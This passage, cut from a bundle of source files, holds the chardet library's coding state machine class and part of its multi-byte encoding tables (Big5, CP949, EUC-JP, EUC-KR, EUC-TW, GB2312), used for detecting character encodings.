167,1998, 201,1999,2000, 843, 836, 824,\n 532, 338, 783,1090, 182, 576, 436,1438,1439, 527, 500,2001, 947, 889,2002,2003,\n2004,2005, 262, 600, 314, 447,2006, 547,2007, 693, 738,1129,2008,  71,1440, 745,\n 619, 688,2009, 829,2010,2011, 147,2012,  33, 948,2013,2014,  74, 224,2015,  61,\n 191, 918, 399, 637,2016,1028,1130, 257, 902,2017,2018,2019,2020,2021,2022,2023,\n2024,2025,2026, 837,2027,2028,2029,2030, 179, 874, 591,  52, 724, 246,2031,2032,\n2033,2034,1167, 969,2035,1289, 630, 605, 911,1091,1168,2036,2037,2038,1441, 912,\n2039, 623,2040,2041, 253,1169,1290,2042,1442, 146, 620, 611, 577, 433,2043,1224,\n 719,1170, 959, 440, 437, 534,  84, 388, 480,1131, 159, 220, 198, 679,2044,1012,\n 819,1066,1443, 113,1225, 194, 318,1003,1029,2045,2046,2047,2048,1067,2049,2050,\n2051,2052,2053,  59, 913, 112,2054, 632,2055, 455, 144, 739,1291,2056, 273, 681,\n 499,2057, 448,2058,2059, 760,2060,2061, 970, 384, 169, 245,1132,2062,2063, 414,\n1444,2064,2065,  41, 235,2066, 157, 252, 877, 568, 919, 789, 580,2067, 725,2068,\n2069,1292,2070,2071,1445,2072,1446,2073,2074,  55, 588,  66,1447, 271,1092,2075,\n1226,2076, 960,1013, 372,2077,2078,2079,2080,2081,1293,2082,2083,2084,2085, 850,\n2086,2087,2088,2089,2090, 186,2091,1068, 180,2092,2093,2094, 109,1227, 522, 606,\n2095, 867,1448,1093, 991,1171, 926, 353,1133,2096, 581,2097,2098,2099,1294,1449,\n1450,2100, 596,1172,1014,1228,2101,1451,1295,1173,1229,2102,2103,1296,1134,1452,\n 949,1135,2104,2105,1094,1453,1454,1455,2106,1095,2107,2108,2109,2110,2111,2112,\n2113,2114,2115,2116,2117, 804,2118,2119,1230,1231, 805,1456, 405,1136,2120,2121,\n2122,2123,2124, 720, 701,1297, 992,1457, 927,1004,2125,2126,2127,2128,2129,2130,\n  22, 417,2131, 303,2132, 385,2133, 971, 520, 513,2134,1174,  73,1096, 231, 274,\n 962,1458, 673,2135,1459,2136, 152,1137,2137,2138,2139,2140,1005,1138,1460,1139,\n2141,2142,2143,2144,  11, 374, 844,2145, 154,1232,  46,1461,2146, 838, 830, 721,\n1233, 106,2147,  90, 428, 462, 578, 566,1175, 352,2148,2149, 538,1234, 124,1298,\n2150,1462, 761, 565,2151, 686,2152, 649,2153,  72, 173,2154, 460, 415,2155,1463,\n2156,1235, 305,2157,2158,2159,2160,2161,2162, 579,2163,2164,2165,2166,2167, 747,\n2168,2169,2170,2171,1464, 669,2172,2173,2174,2175,2176,1465,2177,  23, 530, 285,\n2178, 335, 729,2179, 397,2180,2181,2182,1030,2183,2184, 698,2185,2186, 325,2187,\n2188, 369,2189, 799,1097,1015, 348,2190,1069, 680,2191, 851,1466,2192,2193,  10,\n2194, 613, 424,2195, 979, 108, 449, 589,  27, 172,  81,1031,  80, 774, 281, 350,\n1032, 525, 301, 582,1176,2196, 674,1045,2197,2198,1467, 730, 762,2199,2200,2201,\n2202,1468,2203, 993,2204,2205, 266,1070, 963,1140,2206,2207,2208, 664,1098, 972,\n2209,2210,2211,1177,1469,1470, 871,2212,2213,2214,2215,2216,1471,2217,2218,2219,\n2220,2221,2222,2223,2224,2225,2226,2227,1472,1236,2228,2229,2230,2231,2232,2233,\n2234,2235,1299,2236,2237, 200,2238, 477, 373,2239,2240, 731, 825, 777,2241,2242,\n2243, 521, 486, 548,2244,2245,2246,1473,1300,  53, 549, 137, 875,  76, 158,2247,\n1301,1474, 469, 396,1016, 278, 712,2248, 321, 442, 503, 767, 744, 941,1237,1178,\n1475,2249,  82, 178,1141,1179, 973,2250,1302,2251, 297,2252,2253, 570,2254,2255,\n2256,  18, 450, 206,2257, 290, 292,1142,2258, 511, 162,  99, 346, 164, 735,2259,\n1476,1477,   4, 554, 343, 798,1099,2260,1100,2261,  43, 171,1303, 139, 215,2262,\n2263, 717, 775,2264,1033, 322, 216,2265, 831,2266, 149,2267,1304,2268,2269, 702,\n1238, 135, 845, 347, 309,2270, 484,2271, 878, 655, 238,1006,1478,2272,  67,2273,\n 295,2274,2275, 461,2276, 478, 942, 412,2277,1034,2278,2279,2280, 265,2281, 541,\n2282,2283,2284,2285,2286,  70, 852,1071,2287,2288,2289,2290,  21,  56, 509, 117,\n 432,2291,2292, 331, 980, 552,1101, 148, 284, 105, 393,1180,1239, 755,2293, 187,\n2294,1046,1479,2295, 340,2296,  63,1047, 230,2297,2298,1305, 763,1306, 101, 800,\n 808, 494,2299,2300,2301, 903,2302,  37,1072,  14,   5,2303,  79, 675,2304, 312,\n2305,2306,2307,2308,2309,1480,   6,1307,2310,2311,2312,   1, 470,  35,  24, 229,\n2313, 695, 210,  86, 778,  15, 784, 592, 779,  32,  77, 855, 964,2314, 259,2315,\n 501, 380,2316,2317,  83, 981, 153, 689,1308,1481,1482,1483,2318,2319, 716,1484,\n2320,2321,2322,2323,2324,2325,1485,2326,2327, 128,  57,  68, 261,1048, 211, 170,\n1240,  31,2328,  51, 435, 742,2329,2330,2331, 635,2332, 264, 456,2333,2334,2335,\n 425,2336,1486, 143, 507, 263, 943,2337, 363, 920,1487, 256,1488,1102, 243, 601,\n1489,2338,2339,2340,2341,2342,2343,2344, 861,2345,2346,2347,2348,2349,2350, 395,\n2351,1490,1491,  62, 535, 166, 225,2352,2353, 668, 419,1241, 138, 604, 928,2354,\n1181,2355,1492,1493,2356,2357,2358,1143,2359, 696,2360, 387, 307,1309, 682, 476,\n2361,2362, 332,  12, 222, 156,2363, 232,2364, 641, 276, 656, 517,1494,1495,1035,\n 416, 736,1496,2365,1017, 586,2366,2367,2368,1497,2369, 242,2370,2371,2372,1498,\n2373, 965, 713,2374,2375,2376,2377, 740, 982,1499, 944,1500,1007,2378,2379,1310,\n1501,2380,2381,2382, 785, 329,2383,2384,1502,2385,2386,2387, 932,2388,1503,2389,\n2390,2391,2392,1242,2393,2394,2395,2396,2397, 994, 950,2398,2399,2400,2401,1504,\n1311,2402,2403,2404,2405,1049, 749,2406,2407, 853, 718,1144,1312,2408,1182,1505,\n2409,2410, 255, 516, 479, 564, 550, 214,1506,1507,1313, 413, 239, 444, 339,1145,\n1036,1508,1509,1314,1037,1510,1315,2411,1511,2412,2413,2414, 176, 703, 497, 624,\n 593, 921, 302,2415, 341, 165,1103,1512,2416,1513,2417,2418,2419, 376,2420, 700,\n2421,2422,2423, 258, 768,1316,2424,1183,2425, 995, 608,2426,2427,2428,2429, 221,\n2430,2431,2432,2433,2434,2435,2436,2437, 195, 323, 726, 188, 897, 983,1317, 377,\n 644,1050, 879,2438, 452,2439,2440,2441,2442,2443,2444, 914,2445,2446,2447,2448,\n 915, 489,2449,1514,1184,2450,2451, 515,  64, 427, 495,2452, 583,2453, 483, 485,\n1038, 562, 213,1515, 748, 666,2454,2455,2456,2457, 334,2458, 780, 996,1008, 705,\n1243,2459,2460,2461,2462,2463, 114,2464, 493,1146, 366, 163,1516, 961,1104,2465,\n 291,2466,1318,1105,2467,1517, 365,2468, 355, 951,1244,2469,1319,2470, 631,2471,\n2472, 218,1320, 364, 320, 756,1518,1519,1321,1520,1322,2473,2474,2475,2476, 997,\n2477,2478,2479,2480, 665,1185,2481, 916,1521,2482,2483,2484, 584, 684,2485,2486,\n 797,2487,1051,1186,2488,2489,2490,1522,2491,2492, 370,2493,1039,1187,  65,2494,\n 434, 205, 463,1188,2495, 125, 812, 391, 402, 826, 699, 286, 398, 155, 781, 771,\n 585,2496, 590, 505,1073,2497, 599, 244, 219, 917,1018, 952, 646,1523,2498,1323,\n2499,2500,  49, 984, 354, 741,2501, 625,2502,1324,2503,1019, 190, 357, 757, 491,\n  95, 782, 868,2504,2505,2506,2507,2508,2509, 134,1524,1074, 422,1525, 898,2510,\n 161,2511,2512,2513,2514, 769,2515,1526,2516,2517, 411,1325,2518, 472,1527,2519,\n2520,2521,2522,2523,2524, 985,2525,2526,2527,2528,2529,2530, 764,2531,1245,2532,\n2533,  25, 204, 311,2534, 496,2535,1052,2536,2537,2538,2539,2540,2541,2542, 199,\n 704, 504, 468, 758, 657,1528, 196,  44, 839,1246, 272, 750,2543, 765, 862,2544,\n2545,1326,2546, 132, 615, 933,2547, 732,2548,2549,2550,1189,1529,2551, 283,1247,\n1053, 607, 929,2552,2553,2554, 930, 183, 872, 616,1040,1147,2555,1148,1020, 441,\n 249,1075,2556,2557,2558, 466, 743,2559,2560,2561,  92, 514, 426, 420, 526,2562,\n2563,2564,2565,2566,2567,2568, 185,2569,2570,2571,2572, 776,1530, 658,2573, 362,\n2574, 361, 922,1076, 793,2575,2576,2577,2578,2579,2580,1531, 251,2581,2582,2583,\n2584,1532,  54, 612, 237,1327,2585,2586, 275, 408, 647, 111,2587,1533,1106, 465,\n   3, 458,   9,  38,2588, 107, 110, 890, 209,  26, 737, 498,2589,1534,2590, 431,\n 202,  88,1535, 356, 287,1107, 660,1149,2591, 381,1536, 986,1150, 445,1248,1151,\n 974,2592,2593, 846,2594, 446, 953, 184,1249,1250, 727,2595, 923, 193, 883,2596,\n2597,2598, 102, 324, 539, 817,2599, 421,1041,2600, 832,2601,  94, 175, 197, 406,\n2602, 459,2603,2604,2605,2606,2607, 330, 555,2608,2609,2610, 706,1108, 389,2611,\n2612,2613,2614, 233,2615, 833, 558, 931, 954,1251,2616,2617,1537, 546,2618,2619,\n1009,2620,2621,2622,1538, 690,1328,2623, 955,2624,1539,2625,2626, 772,2627,2628,\n2629,2630,2631, 924, 648, 863, 603,2632,2633, 934,1540, 864, 865,2634, 642,1042,\n 670,1190,2635,2636,2637,2638, 168,2639, 652, 873, 542,1054,1541,2640,2641,2642,  # 512, 256\n)\n\n", "thirdparty/chardet/codingstatemachine.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nimport logging\n\nfrom .enums import MachineState\n\n\nclass CodingStateMachine(object):\n    \"\"\"\n    A state machine to verify a byte sequence for a particular encoding. For\n    each byte the detector receives, it will feed that byte to every active\n    state machine available, one byte at a time. The state machine changes its\n    state based on its previous state and the byte it receives. There are 3\n    states in a state machine that are of interest to an auto-detector:\n\n    START state: This is the state to start with, or a legal byte sequence\n                 (i.e. a valid code point) for character has been identified.\n\n    ME state:  This indicates that the state machine identified a byte sequence\n               that is specific to the charset it is designed for and that\n               there is no other possible encoding which can contain this byte\n               sequence. This will to lead to an immediate positive answer for\n               the detector.\n\n    ERROR state: This indicates the state machine identified an illegal byte\n                 sequence for that encoding. This will lead to an immediate\n                 negative answer for this encoding. Detector will exclude this\n                 encoding from consideration from here on.\n    \"\"\"\n    def __init__(self, sm):\n        self._model = sm\n        self._curr_byte_pos = 0\n        self._curr_char_len = 0\n        self._curr_state = None\n        self.logger = logging.getLogger(__name__)\n        self.reset()\n\n    def reset(self):\n        self._curr_state = MachineState.START\n\n    def next_state(self, c):\n        # for each byte we get its class\n        # if it is first byte, we also get byte length\n        byte_class = self._model['class_table'][c]\n        if self._curr_state == MachineState.START:\n            self._curr_byte_pos = 0\n            self._curr_char_len = self._model['char_len_table'][byte_class]\n        # from byte's class and state_table, we get its next state\n        curr_state = (self._curr_state * self._model['class_factor']\n                      + byte_class)\n        self._curr_state = self._model['state_table'][curr_state]\n        self._curr_byte_pos += 1\n        return self._curr_state\n\n    def get_current_charlen(self):\n        return self._curr_char_len\n\n    def get_coding_state_machine(self):\n        return self._model['name']\n\n    @property\n    def language(self):\n        return self._model['language']\n", "thirdparty/chardet/mbcssm.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .enums import MachineState\n\n# BIG5\n\nBIG5_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07    #allow 0x00 as legal value\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47\n    2,2,2,2,2,2,2,2,  # 48 - 4f\n    2,2,2,2,2,2,2,2,  # 50 - 57\n    2,2,2,2,2,2,2,2,  # 58 - 5f\n    2,2,2,2,2,2,2,2,  # 60 - 67\n    2,2,2,2,2,2,2,2,  # 68 - 6f\n    2,2,2,2,2,2,2,2,  # 70 - 77\n    2,2,2,2,2,2,2,1,  # 78 - 7f\n    4,4,4,4,4,4,4,4,  # 80 - 87\n    4,4,4,4,4,4,4,4,  # 88 - 8f\n    4,4,4,4,4,4,4,4,  # 90 - 97\n    4,4,4,4,4,4,4,4,  # 98 - 9f\n    4,3,3,3,3,3,3,3,  # a0 - a7\n    3,3,3,3,3,3,3,3,  # a8 - af\n    3,3,3,3,3,3,3,3,  # b0 - b7\n    3,3,3,3,3,3,3,3,  # b8 - bf\n    3,3,3,3,3,3,3,3,  # c0 - c7\n    3,3,3,3,3,3,3,3,  # c8 - cf\n    3,3,3,3,3,3,3,3,  # d0 - d7\n    3,3,3,3,3,3,3,3,  # d8 - df\n    3,3,3,3,3,3,3,3,  # e0 - e7\n    3,3,3,3,3,3,3,3,  # e8 - ef\n    3,3,3,3,3,3,3,3,  # f0 - f7\n    3,3,3,3,3,3,3,0  # f8 - ff\n)\n\nBIG5_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.START,     3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,#08-0f\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START#10-17\n)\n\nBIG5_CHAR_LEN_TABLE = (0, 1, 1, 2, 0)\n\nBIG5_SM_MODEL = {'class_table': BIG5_CLS,\n                 'class_factor': 5,\n                 'state_table': BIG5_ST,\n                 'char_len_table': BIG5_CHAR_LEN_TABLE,\n                 'name': 'Big5'}\n\n# CP949\n\nCP949_CLS  = (\n    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,0,0,  # 00 - 0f\n    1,1,1,1,1,1,1,1, 1,1,1,0,1,1,1,1,  # 10 - 1f\n    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,1,1,  # 20 - 2f\n    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,1,1,  # 30 - 3f\n    1,4,4,4,4,4,4,4, 4,4,4,4,4,4,4,4,  # 40 - 4f\n    4,4,5,5,5,5,5,5, 5,5,5,1,1,1,1,1,  # 50 - 5f\n    1,5,5,5,5,5,5,5, 5,5,5,5,5,5,5,5,  # 60 - 6f\n    5,5,5,5,5,5,5,5, 5,5,5,1,1,1,1,1,  # 70 - 7f\n    0,6,6,6,6,6,6,6, 6,6,6,6,6,6,6,6,  # 80 - 8f\n    6,6,6,6,6,6,6,6, 6,6,6,6,6,6,6,6,  # 90 - 9f\n    6,7,7,7,7,7,7,7, 7,7,7,7,7,8,8,8,  # a0 - af\n    7,7,7,7,7,7,7,7, 7,7,7,7,7,7,7,7,  # b0 - bf\n    7,7,7,7,7,7,9,2, 2,3,2,2,2,2,2,2,  # c0 - cf\n    2,2,2,2,2,2,2,2, 2,2,2,2,2,2,2,2,  # d0 - df\n    2,2,2,2,2,2,2,2, 2,2,2,2,2,2,2,2,  # e0 - ef\n    2,2,2,2,2,2,2,2, 2,2,2,2,2,2,2,0,  # f0 - ff\n)\n\nCP949_ST = (\n#cls=    0      1      2      3      4      5      6      7      8      9  # previous state =\n    MachineState.ERROR,MachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,     4,     5,MachineState.ERROR,     6, # MachineState.START\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR, # MachineState.ERROR\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME, # MachineState.ITS_ME\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START, # 3\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START, # 4\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START, # 5\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START, # 6\n)\n\nCP949_CHAR_LEN_TABLE = (0, 1, 2, 0, 1, 1, 2, 2, 0, 2)\n\nCP949_SM_MODEL = {'class_table': CP949_CLS,\n                  'class_factor': 10,\n                  'state_table': CP949_ST,\n                  'char_len_table': CP949_CHAR_LEN_TABLE,\n                  'name': 'CP949'}\n\n# EUC-JP\n\nEUCJP_CLS = (\n    4,4,4,4,4,4,4,4,  # 00 - 07\n    4,4,4,4,4,4,5,5,  # 08 - 0f\n    4,4,4,4,4,4,4,4,  # 10 - 17\n    4,4,4,5,4,4,4,4,  # 18 - 1f\n    4,4,4,4,4,4,4,4,  # 20 - 27\n    4,4,4,4,4,4,4,4,  # 28 - 2f\n    4,4,4,4,4,4,4,4,  # 30 - 37\n    4,4,4,4,4,4,4,4,  # 38 - 3f\n    4,4,4,4,4,4,4,4,  # 40 - 47\n    4,4,4,4,4,4,4,4,  # 48 - 4f\n    4,4,4,4,4,4,4,4,  # 50 - 57\n    4,4,4,4,4,4,4,4,  # 58 - 5f\n    4,4,4,4,4,4,4,4,  # 60 - 67\n    4,4,4,4,4,4,4,4,  # 68 - 6f\n    4,4,4,4,4,4,4,4,  # 70 - 77\n    4,4,4,4,4,4,4,4,  # 78 - 7f\n    5,5,5,5,5,5,5,5,  # 80 - 87\n    5,5,5,5,5,5,1,3,  # 88 - 8f\n    5,5,5,5,5,5,5,5,  # 90 - 97\n    5,5,5,5,5,5,5,5,  # 98 - 9f\n    5,2,2,2,2,2,2,2,  # a0 - a7\n    2,2,2,2,2,2,2,2,  # a8 - af\n    2,2,2,2,2,2,2,2,  # b0 - b7\n    2,2,2,2,2,2,2,2,  # b8 - bf\n    2,2,2,2,2,2,2,2,  # c0 - c7\n    2,2,2,2,2,2,2,2,  # c8 - cf\n    2,2,2,2,2,2,2,2,  # d0 - d7\n    2,2,2,2,2,2,2,2,  # d8 - df\n    0,0,0,0,0,0,0,0,  # e0 - e7\n    0,0,0,0,0,0,0,0,  # e8 - ef\n    0,0,0,0,0,0,0,0,  # f0 - f7\n    0,0,0,0,0,0,0,5  # f8 - ff\n)\n\nEUCJP_ST = (\n          3,     4,     3,     5,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n     MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n     MachineState.ITS_ME,MachineState.ITS_ME,MachineState.START,MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#10-17\n     MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     3,MachineState.ERROR,#18-1f\n          3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START#20-27\n)\n\nEUCJP_CHAR_LEN_TABLE = (2, 2, 2, 3, 1, 0)\n\nEUCJP_SM_MODEL = {'class_table': EUCJP_CLS,\n                  'class_factor': 6,\n                  'state_table': EUCJP_ST,\n                  'char_len_table': EUCJP_CHAR_LEN_TABLE,\n                  'name': 'EUC-JP'}\n\n# EUC-KR\n\nEUCKR_CLS  = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    1,1,1,1,1,1,1,1,  # 30 - 37\n    1,1,1,1,1,1,1,1,  # 38 - 3f\n    1,1,1,1,1,1,1,1,  # 40 - 47\n    1,1,1,1,1,1,1,1,  # 48 - 4f\n    1,1,1,1,1,1,1,1,  # 50 - 57\n    1,1,1,1,1,1,1,1,  # 58 - 5f\n    1,1,1,1,1,1,1,1,  # 60 - 67\n    1,1,1,1,1,1,1,1,  # 68 - 6f\n    1,1,1,1,1,1,1,1,  # 70 - 77\n    1,1,1,1,1,1,1,1,  # 78 - 7f\n    0,0,0,0,0,0,0,0,  # 80 - 87\n    0,0,0,0,0,0,0,0,  # 88 - 8f\n    0,0,0,0,0,0,0,0,  # 90 - 97\n    0,0,0,0,0,0,0,0,  # 98 - 9f\n    0,2,2,2,2,2,2,2,  # a0 - a7\n    2,2,2,2,2,3,3,3,  # a8 - af\n    2,2,2,2,2,2,2,2,  # b0 - b7\n    2,2,2,2,2,2,2,2,  # b8 - bf\n    2,2,2,2,2,2,2,2,  # c0 - c7\n    2,3,2,2,2,2,2,2,  # c8 - cf\n    2,2,2,2,2,2,2,2,  # d0 - d7\n    2,2,2,2,2,2,2,2,  # d8 - df\n    2,2,2,2,2,2,2,2,  # e0 - e7\n    2,2,2,2,2,2,2,2,  # e8 - ef\n    2,2,2,2,2,2,2,2,  # f0 - f7\n    2,2,2,2,2,2,2,0   # f8 - ff\n)\n\nEUCKR_ST = (\n    MachineState.ERROR,MachineState.START,     3,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#00-07\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START #08-0f\n)\n\nEUCKR_CHAR_LEN_TABLE = (0, 1, 2, 0)\n\nEUCKR_SM_MODEL = {'class_table': EUCKR_CLS,\n                'class_factor': 4,\n                'state_table': EUCKR_ST,\n                'char_len_table': EUCKR_CHAR_LEN_TABLE,\n                'name': 'EUC-KR'}\n\n# EUC-TW\n\nEUCTW_CLS = (\n    2,2,2,2,2,2,2,2,  # 00 - 07\n    2,2,2,2,2,2,0,0,  # 08 - 0f\n    2,2,2,2,2,2,2,2,  # 10 - 17\n    2,2,2,0,2,2,2,2,  # 18 - 1f\n    2,2,2,2,2,2,2,2,  # 20 - 27\n    2,2,2,2,2,2,2,2,  # 28 - 2f\n    2,2,2,2,2,2,2,2,  # 30 - 37\n    2,2,2,2,2,2,2,2,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47\n    2,2,2,2,2,2,2,2,  # 48 - 4f\n    2,2,2,2,2,2,2,2,  # 50 - 57\n    2,2,2,2,2,2,2,2,  # 58 - 5f\n    2,2,2,2,2,2,2,2,  # 60 - 67\n    2,2,2,2,2,2,2,2,  # 68 - 6f\n    2,2,2,2,2,2,2,2,  # 70 - 77\n    2,2,2,2,2,2,2,2,  # 78 - 7f\n    0,0,0,0,0,0,0,0,  # 80 - 87\n    0,0,0,0,0,0,6,0,  # 88 - 8f\n    0,0,0,0,0,0,0,0,  # 90 - 97\n    0,0,0,0,0,0,0,0,  # 98 - 9f\n    0,3,4,4,4,4,4,4,  # a0 - a7\n    5,5,1,1,1,1,1,1,  # a8 - af\n    1,1,1,1,1,1,1,1,  # b0 - b7\n    1,1,1,1,1,1,1,1,  # b8 - bf\n    1,1,3,1,3,3,3,3,  # c0 - c7\n    3,3,3,3,3,3,3,3,  # c8 - cf\n    3,3,3,3,3,3,3,3,  # d0 - d7\n    3,3,3,3,3,3,3,3,  # d8 - df\n    3,3,3,3,3,3,3,3,  # e0 - e7\n    3,3,3,3,3,3,3,3,  # e8 - ef\n    3,3,3,3,3,3,3,3,  # f0 - f7\n    3,3,3,3,3,3,3,0   # f8 - ff\n)\n\nEUCTW_ST = (\n    MachineState.ERROR,MachineState.ERROR,MachineState.START,     3,     3,     3,     4,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n    MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.START,MachineState.ERROR,#10-17\n    MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,#18-1f\n         5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.ERROR,MachineState.START,MachineState.START,#20-27\n    MachineState.START,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START #28-2f\n)\n\nEUCTW_CHAR_LEN_TABLE = (0, 0, 1, 2, 2, 2, 3)\n\nEUCTW_SM_MODEL = {'class_table': EUCTW_CLS,\n                'class_factor': 7,\n                'state_table': EUCTW_ST,\n                'char_len_table': EUCTW_CHAR_LEN_TABLE,\n                'name': 'x-euc-tw'}\n\n# GB2312\n\nGB2312_CLS = (\n    1,1,1,1,1,1,1,1,  # 00 - 07\n    1,1,1,1,1,1,0,0,  # 08 - 0f\n    1,1,1,1,1,1,1,1,  # 10 - 17\n    1,1,1,0,1,1,1,1,  # 18 - 1f\n    1,1,1,1,1,1,1,1,  # 20 - 27\n    1,1,1,1,1,1,1,1,  # 28 - 2f\n    3,3,3,3,3,3,3,3,  # 30 - 37\n    3,3,1,1,1,1,1,1,  # 38 - 3f\n    2,2,2,2,2,2,2,2,  # 40 - 47\n    2,2,2,2,2,2,2,2,  # 48 - 4f\n    2,2,2,2,2,2,2,2,  # 50 - 57\n    2,2,2,2,2,2,2,2,  # 58 - 5f\n    2,2,2,2,2,2,2,2,  # 60 - 67\n    2,2,2,2,2,2,2,2,  # 68 - 6f\n    2,2,2,2,2,2,2,2,  # 70 - 77\n    2,2,2,2,2,2,2,4,  # 78 - 7f\n    5,6,6,6,6,6,6,6,  # 80 - 87\n    6,6,6,6,6,6,6,6,  # 88 - 8f\n    6,6,6,6,6,6,6,6,  # 90 - 97\n    6,6,6,6,6,6,6,6,  # 98 - 9f\n    6,6,6,6,6,6,6,6,  # a0 - a7\n    6,6,6,6,6,6,6,6,  # a8 - af\n    6,6,6,6,6,6,6,6,  # b0 - b7\n    6,6,6,6,6,6,6,6,  # b8 - bf\n    6,6,6,6,6,6,6,6,  # c0 - c7\n    6,6,6,6,6,6,6,6,  # c8 - cf\n    6,6,6,6,6,6,6,6,  # d0 - d7\n    6,6,6,6,6,6,6,6,  # d8 - df\n    6,6,6,6,6,6,6,6,  # e0 - e7\n    6,6,6,6,6,6,6,6,  # e8 - ef\n    6,6,6,6,6,6,6,6,  # f0 - f7\n    6,6,6,6,6,6,6,0   # f8 - ff\n)\n\nGB2312_ST = (\n    MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,     3,MachineState.ERROR,#00-07\n    MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,#08-0f\n    